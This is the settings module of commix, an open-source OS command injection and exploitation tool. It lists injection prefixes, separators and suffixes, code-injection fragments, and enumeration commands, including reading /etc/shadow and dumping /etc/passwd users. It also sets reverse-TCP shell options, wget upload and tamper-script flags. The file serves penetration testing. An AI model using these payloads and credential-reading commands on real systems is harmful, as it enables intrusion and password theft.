#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import time
import errno
import urllib
import socket
import random
from socket import error as socket_error
from src.thirdparty.colorama import Fore, Back, Style, init

# Status Signs
SUCCESS_SIGN =  "[" + Fore.GREEN + Style.BRIGHT + "+" + Style.RESET_ALL + "] "
INFO_SIGN =  Style.RESET_ALL + "[" + Fore.BLUE + Style.BRIGHT + "*" + Style.RESET_ALL + "] "
QUESTION_SIGN =  Style.RESET_ALL + "[" + Style.BRIGHT + Fore.MAGENTA + "?" + Style.RESET_ALL + "] "
WARNING_SIGN =  "[" + Fore.YELLOW  + "!" + Style.RESET_ALL + "] " + Fore.YELLOW + "Warning: "
WARNING_BOLD_SIGN =  "[" + Style.BRIGHT + Fore.YELLOW  + "!" + Style.RESET_ALL + "] " + Style.BRIGHT + Fore.YELLOW + "Warning: "
ERROR_SIGN =  "[" + Fore.RED + Style.BRIGHT + "x" + Style.RESET_ALL  + "] " + Fore.RED 
ABORTION_SIGN =  "[" + Fore.RED + Style.BRIGHT + "x" + Style.RESET_ALL  + "] " + Fore.RED 
CRITICAL_SIGN =  Back.RED + "[x] Critical: "
PAYLOAD_SIGN =  "    |_ " + Fore.CYAN
CHECK_SIGN =  "[" + Fore.BLUE + Style.BRIGHT + "*" + Style.RESET_ALL  + "] " + "Checking "
SUB_CONTENT_SIGN =  "    [" + Fore.GREY + Style.BRIGHT + "~" + Style.RESET_ALL  + "] "

# Print error message
def print_error_msg(err_msg):
  result = ERROR_SIGN + str(err_msg) + Style.RESET_ALL
  return result

# Print critical error message
def print_critical_msg(err_msg):
  result = CRITICAL_SIGN + str(err_msg) + Style.RESET_ALL
  return result

# Print abortion message
def print_abort_msg(abort_msg):
  result = ABORTION_SIGN + str(abort_msg) + Style.RESET_ALL
  return result

# Print warning message
def print_warning_msg(warn_msg):
  result = WARNING_SIGN + str(warn_msg)  + Style.RESET_ALL
  return result

# Print warning message
def print_bold_warning_msg(warn_msg):
  result = WARNING_BOLD_SIGN + str(warn_msg)  + Style.RESET_ALL
  return result

# Print information message
def print_info_msg(info_msg):
  result = INFO_SIGN + str(info_msg) + Style.RESET_ALL
  return result

# Print success message
def print_success_msg(success_msg):
  result = SUCCESS_SIGN + Style.BRIGHT + str(success_msg) + Style.RESET_ALL
  return result

# Print payload (verbose mode)
def print_payload(payload):
  result = PAYLOAD_SIGN + str(payload) + Style.RESET_ALL
  return result

# Print checking message (verbose mode)
def print_checking_msg(payload):
  result = CHECK_SIGN + str(payload) + Style.RESET_ALL
  return result

# Print question message
def print_question_msg(question_msg):
  result = QUESTION_SIGN + question_msg 
  return result

"""
The global variables.
"""
# About
APPLICATION = "commix"
DESCRIPTION_FULL = "Automated All-in-One OS Command Injection and Exploitation Tool"
DESCRIPTION = "The command injection exploiter"
AUTHOR  = "Anastasios Stasinopoulos"
VERSION_NUM = "1.3.2"
STABLE_VERSION = False
if STABLE_VERSION:
  VERSION = VERSION_NUM[:3]
else:
  VERSION = VERSION_NUM + "-dev"
YEAR = "2014-2016"
AUTHOR_TWITTER = "@ancst" 
APPLICATION_TWITTER = "@commixproject" 

# Inject Tag
INJECT_TAG = "INJECT_HERE"

# The wildcard character
WILDCARD_CHAR = "*"

# Testable parameter(s) comma separated. 
TEST_PARAMETER = ""

# Default target host OS (Unix-like)
TARGET_OS = "unix"

# Verbosity level: 0-1 (default 0)
VERBOSITY_LEVEL = 0

# Local HTTP Server
try:
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("8.8.8.8",53))
except socket_error, err:
  if errno.ECONNREFUSED:
    err_msg = "Network is unreachable."
    print print_critical_msg(err_msg) + "\n"
  else:
    err_msg = err
    print print_critical_msg(err_msg) + "\n"
  sys.exit(0)
# Local HTTP server ip
LOCAL_HTTP_IP = (s.getsockname()[0])
s.close()

# Local HTTP server port
LOCAL_HTTP_PORT = random.randint(50000,60000)

# Exploitation techniques states
CLASSIC_STATE = False
EVAL_BASED_STATE = False
TIME_BASED_STATE = False
FILE_BASED_STATE = False
TEMPFILE_BASED_STATE = False
TIME_RELATIVE_ATTACK = False

# Stored applied techniques
SESSION_APPLIED_TECHNIQUES = ""

# Check if OS is Windows.
IS_WINDOWS = hasattr(sys, 'getwindowsversion')

# Git URL.
GIT_URL = "https://github.com/stasinopoulos/" + APPLICATION + ".git"

# Output Directory
OUTPUT_DIR = ".output/"  

# Output file name
OUTPUT_FILE_NAME = "logs"

# Output file name
OUTPUT_FILE_EXT = ".txt"
OUTPUT_FILE = OUTPUT_FILE_NAME + OUTPUT_FILE_EXT

# Max Length.
MAXLEN = "10000"

# Slow target response.
SLOW_TARGET_RESPONSE = 3

# The testable parameter.
TESTABLE_PARAMETER = "" 

# The HTTP header name.
HTTP_HEADER = ""

# The command injection prefixes.
PREFIXES = ["", " ", "'", "\"", "&", "%26", "|", "%7C", "%27", "%22"] 

# The command injection separators.
SEPARATORS = [";", "%3B", "&", "%26", "&&", "%26%26", "|", "%7C", "||", "%7C%7C", "%0a"]

# The command injection suffixes.
SUFFIXES = ["", "'", "\"", "#", "//", "\\\\", "&&", "%26%26", "|", "%7C", "%27", "%22", "%5C%5C", "%2F%2F"]

# Bad combination of prefix and separator
JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&"]

# Execution functions
EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]

# The code injection prefixes.
EVAL_PREFIXES = ["", ";", "'", ")", "')", "\")", "\".", "'.", ");}", "');}", "\");}"]

# The code injection separators.
EVAL_SEPARATORS = ["", "%0a", "\\\\n"]

# The code injection suffixes.
EVAL_SUFFIXES = ["", "\\\\", "//", "#", ".\"", ".'", ")}"]

# The white-spaces
WHITESPACE = ["%20"]

# Time delay
DELAY = 1

#Level (Default: 1)
DEFAULT_INJECTION_LEVEL = 1
COOKIE_INJECTION_LEVEL = 2
HTTP_HEADER_INJECTION_LEVEL = 3

# Default Temp Directory
TMP_PATH = ""

# Default Server's Root Directory
SRV_ROOT_DIR = ""
DEFAULT_SRV_ROOT_DIR = ""
CUSTOM_SRV_ROOT_DIR = False

# The max help option length.
MAX_OPTION_LENGTH = 18

# Python version.
PYTHON_VERSION = sys.version.split()[0]

# Enumeration Commands
# Output PowerShell's version number
PS_VERSION = "powershell.exe -InputFormat none write-host ([string]$(cmd /c powershell.exe -InputFormat none get-host)[3]).replace('Version','').replace(' ','').substring(1,3)"

# Current user
CURRENT_USER = "whoami"
WIN_CURRENT_USER = "echo %username%"

# The hostname
HOSTNAME = "hostname"
WIN_HOSTNAME = "echo %computername%"

# Check if current user is root
IS_ROOT = "echo $(id -u)"
# Check if current user is admin
IS_ADMIN = "powershell.exe -InputFormat none [Security.Principal.WindowsBuiltinRole]::Administrator"

# Operation System.
RECOGNISE_OS = "uname -s"
WIN_RECOGNISE_OS = "ver"

# Hardware platform.
RECOGNISE_HP = "uname -m"
WIN_RECOGNISE_HP = "echo %PROCESSOR_ARCHITECTURE%"

# File System access options
# Read file
FILE_READ = "cat "
WIN_FILE_READ = "type "

# Write file
FILE_WRITE = "echo "

# Write file
FILE_UPLOAD = "wget "

# /etc/passwd
PASSWD_FILE = "/etc/passwd"
SYS_USERS = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE 

# Exports users of localgroup
WIN_SYS_USERS = "powershell.exe -InputFormat none write-host (([string]$(net user)[4..($(net user).length-3)])"

# /etc/shadow
SHADOW_FILE = "/etc/shadow"
SYS_PASSES = FILE_READ + SHADOW_FILE 

# Accepts 'YES','YE','Y','yes','ye','y'
CHOICE_YES = ['yes','ye','y']

# Accepts 'NO','N','no','n'
CHOICE_NO = ['no','n']

# Accepts 'QUIT','Q','quit','q'
CHOICE_QUIT = ['q','quit']

# Accepts 'W','w','U','u','Q','q'
CHOICE_OS = ['w','u','q']

# Accepts 'C','c','S','s','Q','q','a','A','n','N'
CHOICE_PROCEED = ['c','s','q','a','n']

# Available alternative shells
AVAILABLE_SHELLS = ["python"]

# Available injection techniques.
AVAILABLE_TECHNIQUES = [ "c", "e", "t", "f" ]

# User Agent List
USER_AGENT_LIST = [
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/31.0",
        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/31.0",
        # Oldies 
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
]

# Proxy Protocol
PROXY_PROTOCOL = "http"

# Privoxy Proxy
PRIVOXY_IP = "127.0.0.1"
PRIVOXY_PORT = "8118"

# Cookie injection
COOKIE_INJECTION = False

# User-Agent injection
USER_AGENT_INJECTION = None

# Referer injection
REFERER_INJECTION = None

# Custom HTTP Headers injection
CUSTOM_HEADER_INJECTION = False
CUSTOM_HEADER_NAME = "" 

# Valid URL format check
VALID_URL_FORMAT = "https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,300})?"

# Accepted shell menu options
SHELL_OPTIONS = [
        '?',
        'quit',
        'back',
        'os_shell',
        'reverse_tcp',
        'set',
]

# Accepted reverse tcp shell menu options
SET_OPTIONS = [
        'LHOST',
        'LPORT'
]

# Cookie delimiter
COOKIE_DELIMITER = ";"

# Split parameter value
PARAMETER_SPLITTING_REGEX = r'[,]'

# Cookie delimiter
PARAMETER_DELIMITER = "&"

# Web-page Charset
CHARSET = ""

# Page default charset
DEFAULT_CHARSET = "utf-8"

# Character Sets List (basic)
CHARSET_LIST = [
        "big5",
        "euc-kr",
        "iso-8859-1",
        "iso-8859-2",
        "iso-8859-3",
        "iso-8859-4",
        "iso-8859-5",
        "iso-8859-6",
        "iso-8859-7",
        "iso-8859-8",
        "koi8-r",
        "shift-jis",
        "x-euc",
        "utf-8",
        "windows-1250",
        "windows-1251",
        "windows-1252",
        "windows-1253",
        "windows-1254",
        "windows-1255",
        "windows-1256",
        "windows-1257",
        "windows-1258",
        "windows-874",
]

# Default server banner
SERVER_BANNER = ""

# Server banners list
SERVER_BANNERS = [
    "Microsoft-IIS",
    "Apache",
    "Nginx"
]

# Server banners list
SERVER_OS_BANNERS = [
    "microsoft",
    "win",
    "debian",
    "ubuntu",
    "fedora",
    "centos",
    "freebsd",
    "unix"
]

TARGET_APPLICATION = ""
# Unsupported target application(s) [1]
# [1] https://github.com/stasinopoulos/commix/wiki/Target-applications
UNSUPPORTED_TARGET_APPLICATION = [ 
    "JSP"
]

REVERSE_TCP = False

# Injection logs report
SHOW_LOGS_MSG = False

# Enumeration options
ENUMERATION_DONE = False
ENUMERATE_AGAIN = False

# FIle access options
FILE_ACCESS_DONE = False
FILE_ACCESS_AGAIN = False

# JSON Data
IS_JSON = False

# JSON Symbols
JSON_RECOGNITION_REGEX = r'(?s)\A(\s*\[)*\s*\{.*"[^"]+"\s*:\s*("[^"]+"|\d+).*\}\s*(\]\s*)*\Z'

# B64 format recognition
BASE64_RECOGNITION_REGEX = r'^[A-Za-z0-9+/]+[=]{0,2}$'

# TFB Decimal
TFB_DECIMAL = False

# Ignore Error Message
IGNORE_ERR_MSG = False

# Windows Python (2.7) installed directory.
WIN_PYTHON_DIR = "C:\\Python27\\python.exe"
USER_DEFINED_PYTHON_DIR = False

# Windows PHP installed directory.
WIN_PHP_DIR = "C:\\xampp\\php\\php.exe"

# Comment out
WIN_COMMENT = "REM"
COMMENT = "#"

#Delete command
WIN_DEL = "DEL "
DEL = "rm "

# Time-based Variables
FOUND_HOW_LONG = "" 
FOUND_DIFF = ""

# Failed (injection) tries
FAILED_TRIES = 20

# Check for PowerShell
PS_ENABLED = None

# ANSI colors removal
ANSI_COLOR_REMOVAL = r'\x1b[^m]*m'

# Default LHOST / LPORT setup, 
# for the reverse TCP connection
LHOST = ""
LPORT = ""

# Maybe a WAF/IPS/IDS protection.
WAF_ENABLED = False

# Session Handler
SESSION_FILE = ""
LOAD_SESSION = None

# Retest all techniques
RETEST = False

# Define the default credentials files
USERNAMES_TXT_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "usernames.txt"
PASSWORDS_TXT_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "passwords_john.txt"

REQUIRED_AUTHENTICATION = False

INJECTED_HTTP_HEADER = False
INJECTION_CHECKER = False

# List of pages / scripts potentially vulnerable to Shellshock
CGI_SCRIPTS = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "shocker-cgi_list.txt"

# Metasploit Framework Path
METASPLOIT_PATH = "/usr/share/metasploit-framework/"

# Supported HTTP Authentication types
SUPPORTED_HTTP_AUTH_TYPES = [ "basic", "digest" ]

# HTTP Headers
HTTP_HEADERS = [ "useragent", "referer" ]

# Tamper scripts dict
TAMPER_SCRIPTS = {
                  "space2ifs": False,
                  "base64encode": False,
                  "space2plus": False,
                  "space2tab": False
                 }

# HTTP Errors
UNAUTHORIZED_ERROR = "401"
FORBIDDEN_ERROR = "403"
NOT_FOUND_ERROR = "404"
NOT_ACCEPTABLE_ERROR = "406"
INTERNAL_SERVER_ERROR = "500"

# End line
END_LINE = ["\r", "\n", "\r\n"]

# Check for updates on start up.
CHECK_FOR_UPDATES_ON_START = True

#eof